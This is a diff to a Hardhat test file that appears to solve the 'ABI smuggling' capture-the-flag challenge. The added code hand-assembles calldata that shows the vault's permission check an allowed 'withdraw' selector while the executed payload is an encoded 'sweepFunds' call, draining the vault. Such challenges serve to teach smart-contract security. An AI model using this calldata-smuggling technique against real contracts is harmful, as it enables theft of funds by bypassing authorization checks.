@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { AbiCoder, defaultAbiCoder } = require('ethers/lib/utils');
+const { defaultAbiCoder } = require('ethers/lib/utils');
+const { call } = require('eth-permit/dist/rpc');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
@@ -46,15 +47,34 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        const sweepFundsEncodedParams = defaultAbiCoder.encode(
-            ["address", "address"], 
-            [recovery.address, token.address])
-        console.log("0x85fb709d" + sweepFundsEncodedParams.slice(2, sweepFundsEncodedParams.length))    
-        const sweepFundsEncodedFunc = "0x85fb709d" + sweepFundsEncodedParams.slice(2, sweepFundsEncodedParams.length)
-        await vault.connect(deployer).execute(
-            vault.address, 
-            sweepFundsEncodedFunc
-        )
+        const executeFn = await vault.interface.getFunction('execute')
+        const executeSelector = await vault.interface.getSighash(executeFn)
+        const vaultAddr = await ethers.utils.hexZeroPad(vault.address, 32);
+        
+        const exploitOffset = await ethers.utils.hexZeroPad("0x80", 32)
+        const exploitSize = await ethers.utils.hexZeroPad("0x44", 32)
+        const nops = await ethers.utils.hexZeroPad("0x0", 32)
+
+        const withdrawFn = await vault.interface.getFunction('withdraw')
+        const withdrawSelector = await vault.interface.getSighash(withdrawFn)
+        const withdrawSelectorPadded = withdrawSelector + "00000000000000000000000000000000000000000000000000000000"
+        
+        const padding = await ethers.utils.hexZeroPad("0x0", 24);
+        
+        const exploit = await vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
+
+        const actionData = await ethers.utils.hexConcat([
+            exploitOffset, nops, withdrawSelectorPadded, exploitSize, exploit, padding
+        ])
+
+        const calldata = await ethers.utils.hexConcat([executeSelector, vaultAddr, actionData])
+        const tx = {
+            to: vault.address,
+            value: 0,
+            data: calldata,
+            gasLimit: 500000
+          }
+        await player.sendTransaction(tx)
     });
 
     after(async function () {
